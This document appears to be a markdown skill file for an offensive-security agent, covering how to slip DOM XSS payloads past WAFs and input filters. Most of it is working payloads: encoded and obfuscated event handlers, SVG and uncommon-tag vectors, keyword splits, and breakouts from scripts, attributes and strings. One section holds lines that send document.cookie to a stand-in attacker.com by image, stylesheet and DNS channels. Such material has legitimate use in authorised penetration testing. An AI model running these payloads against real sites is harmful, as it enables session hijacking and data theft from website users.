# DOM XSS — WAF / Filter Bypass

## When this applies

A baseline XSS payload is detected and blocked by a WAF, content filter, or input sanitizer. The bypass relies on character encoding, alternate tag/attribute syntax, keyword splits, and context-aware breakouts to slip past pattern matching while still triggering the sink.

## Technique

Five families of bypass: character encoding, tag/attribute variations, keyword splitting, context-specific breakouts, and exfiltration channel substitution.

## Steps

### Character Encoding

**HTML entities:**
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
```

**JavaScript Unicode:**
```javascript
<img src=x onerror="alert(1)">
<img src=x onerror="\x61\x6c\x65\x72\x74(1)">
```

**Hex encoding:**
```javascript
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">
```

**Base64:**
```javascript
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### Tag and Attribute Variations

**SVG vectors:**
```html
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

**Using less common tags:**
```html
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<select onfocus=alert(1) autofocus>
```

**Alternative attributes:**
```html
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>
```

### Keyword Bypasses

**Splitting "alert":**
```javascript
<img src=x onerror="ale"+"rt(1)">
<img src=x onerror="window['ale'+'rt'](1)">
<img src=x onerror="(alert)(1)">
<img src=x onerror="[alert][0](1)">
```

**Using eval:**
```javascript
<img src=x onerror="eval('ale'+'rt(1)')">
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

**Using Function constructor:**
```javascript
<img src=x onerror="Function('ale'+'rt(1)')()">
<img src=x onerror="[].constructor.constructor('ale'+'rt(1)')()">
```

### Context-Specific Bypasses

**Breaking out of script tags:**
```html
</script><img src=x onerror=alert(1)>
</script><svg onload=alert(1)>
```

**Breaking out of attributes:**
```html
" onclick="alert(1)
' onclick='alert(1)
" onfocus="alert(1)" autofocus="
```

**Breaking out of JavaScript strings:**
```javascript
'; alert(1); //
\'; alert(1); //
'; alert(1); var x='
```

### Exfiltration Channel Substitution

When `fetch` to attacker domain is blocked by `connect-src` CSP:
```javascript
// fetch blocked → use img GET
<img src=x onerror="new Image().src='https://attacker.com?c='+document.cookie">

// img blocked → use stylesheet
<link rel=stylesheet href="https://attacker.com?c=...">

// stylesheet blocked → DNS-based
<img src="//xfil.<random>.attacker.com">
```

## Verifying success

- Baseline payload (e.g., `<script>alert(1)</script>`) is blocked (403, sanitized to text, etc.).
- Bypass payload is not blocked AND triggers execution in the browser.
- Differential test: same target, two payloads, two outcomes — confirms the bypass is what works.

## Common pitfalls

1. **Encoding works only in specific contexts** — HTML entities decode in HTML, not in JavaScript strings. Hex `\x61` decodes only in JS, not in HTML attribute parsing (unless inside an event handler value, which goes through JS parser).
2. **Filter applies twice** — server-side filter + client-side filter; bypass needs to survive both.
3. **CSP blocks the sink even after filter bypass** — your payload reaches the sink, but `script-src 'self'` denies execution. Pivot to gadgets allowed by CSP.
4. **WAF rule updates** — what worked yesterday may be blocked today; keep multiple alternatives ready.
5. **Browser parser quirks** — Chrome and Firefox handle malformed HTML slightly differently; test in the target's intended browser.

## Tools

- **PortSwigger XSS cheat sheet** — exhaustive vector list
- **PayloadsAllTheThings (`patt-fetcher` skill)** — payload corpus by sink/context
- **`html_entity` / `unicode_encode` shells in Python** — quick conversion of payloads
- **Burp Intruder** — fuzz with bypass list
- **`wafw00f`** — fingerprint the WAF; choose targeted bypasses
